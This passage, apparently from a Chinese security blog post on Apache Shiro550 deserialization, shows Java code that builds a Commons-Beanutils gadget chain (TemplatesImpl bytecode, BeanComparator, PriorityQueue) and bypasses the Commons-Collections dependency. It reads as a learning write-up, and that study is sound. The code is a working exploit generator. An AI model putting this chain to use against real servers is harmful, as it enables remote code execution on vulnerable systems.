+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileInputStream</span><span style="color: #ABB2BF">(Filename));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> obj;</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li>
+</ul>
+<blockquote>
+<p>运行发现报错</p>
+<p>没有找到outputProperties</p>
+</blockquote>
+<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251211113511046.png" srcset="/img/loading.gif" lazyload alt="image-20251211113511005" style="zoom:150%;" />
+
+<ul>
+<li>因为在CB编写的时候，就有些东西是和CC来配合的，在<code>BeanComparator</code>的构造函数中，会默认调用<code>ComparableComparator</code>的<code>getInstance</code>方法，而<code>ComparableComparator</code>是cc依赖中的，shiro中默认没有带cc依赖，导致的错误发生</li>
+</ul>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">BeanComparator</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Comparator</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Serializable</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> property</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Comparator</span><span style="color: #E06C75"> comparator</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> BeanComparator</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">((String)</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> BeanComparator</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">property</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">(property, </span><span style="color: #E5C07B">ComparableComparator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure>
+
+<ul>
+<li><p>而<code>BeanComparator</code>还有一个构造函数如下，里面的<code>Comparator</code>是可以自己传的，所以我们可以用这个构造函数来绕过cc的依赖</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> property</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Comparator</span><span style="color: #E06C75"> comparator) {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setProperty</span><span style="color: #ABB2BF">(property);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (comparator </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">comparator</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> comparator</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">comparator</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ComparableComparator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li>
+</ul>
+<p><strong>解决</strong>:</p>
+<ul>
+<li><p>在<code>beanComparator</code>这里传入一个不为cc依赖的<code>Comparator</code>即可</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #E06C75"> templates </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TemplatesImpl</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> tl </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">templates</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, </span><span style="color: #98C379">&quot;CC3&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] code</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;C://Users//95227//Desktop//实验室//其他//序列化//class//Test.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[][] codes</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">{code}</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> bytecodes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_bytecodes&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, codes);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">BeanComparator</span><span style="color: #E06C75"> beanComparator </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;outputProperties&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #E06C75"> priorityQueue </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(beanComparator)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(templates);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> aClass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> size </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">aClass</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;size&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">size</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(priorityQueue, </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(priorityQueue)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
+</li>
+<li><p>add方法时候会报错导致序列化不成功（这里是在传入Intger时，也会调用Integer类的getOutputProperties的方法，但是他实际没有这个方法所以报错）</p>
+<ul>
+<li><p>所以在向<code>PriorityQueue</code>传入<code>Comparator</code>时，传入一个无用的<code>transformingComparator</code>，然后通过反射修改回来（就是完全使用cc2的后半段）+AttrComparator（自己写的一个脚本，<code>Comparator</code>和<code>Serializable</code>接口的交际得到<code>AttrComparator</code>）</p>
+<p>虽然没有cc，但是因为他影响的最后序列化的参数，和你本地怎么改没关系（成功即可）</p>
+</li>
+<li><p>这里还有一个方法，在add时，只添加数字，后续将 <code>priorityQueue.add(templates);</code>通过反射修改回来</p>
+</li>
+</ul>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span>
+<span class="line"><span style="color: #E06C75">    	</span><span style="color: #7F848E; font-style: italic">//cc3</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">TemplatesImpl</span><span style="color: #E06C75"> templates </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">TemplatesImpl</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> tl </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">templates</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, </span><span style="color: #98C379">&quot;CC3&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] code</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;C://Users//95227//Desktop//实验室//其他//序列化//class//Test.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[][] codes</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">{code}</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> bytecodes </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">tl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;_bytecodes&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">bytecodes</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(templates, codes);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">BeanComparator</span><span style="color: #E06C75"> beanComparator </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">BeanComparator</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;outputProperties&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">AttrComparator</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//此处修改就可</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    	</span><span style="color: #7F848E; font-style: italic">//cc2</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">TransformingComparator</span><span style="color: #E06C75"> transformingComparator </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TransformingComparator</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ConstantTransformer</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(</span><span style="color: #D19A66">1</span><span style="color: #E06C75">))</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #E06C75"> priorityQueue </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">(transformingComparator)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(templates);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">priorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    		</span><span style="color: #7F848E; font-style: italic">//反射修改</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> priorityQueueClass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">PriorityQueue</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> comparator </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">priorityQueueClass</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;comparator&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">comparator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">comparator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(priorityQueue, beanComparator);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(priorityQueue)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/Shiro550/" class="print-no-link">#Shiro550</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shiro550反序列化</div>
+      <div>http://example.com/2025/12/11/shiro反序列化（Shiro550）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/08/Shiro/" title="Shiro">
+                        <span class="hidden-mobile">Shiro</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
